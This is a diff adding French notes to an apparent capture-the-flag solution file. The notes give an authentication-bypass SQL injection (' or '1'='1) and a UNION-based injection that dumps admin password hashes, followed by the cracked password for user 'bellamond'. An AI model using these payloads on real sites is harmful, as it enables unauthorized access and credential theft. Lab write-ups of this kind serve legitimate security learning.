@@ -319,3 +319,14 @@ dans le scratchpad :
 alert(d);
 ```
 ==> hats
+
+#SQLi
+##Level 1
+login = mdp = ' or '1'='1
+
+##Level 2
+afficher les comptes et sélectionner une lettre.
+remplacer q=... par q=%' and admin='1' union select password, admin from members where admin like '1%'='
+on a un seul utilisateur : bellamond et son mot de passe 1b774bc166f3f8918e900fcef8752817bae76a37
+google => http://md5.znaet.org/md5/1cd30461f1450f450c4fc598afe5c6d5#.VD5mv7t_wW0
+c'est le sha1 de sup3r
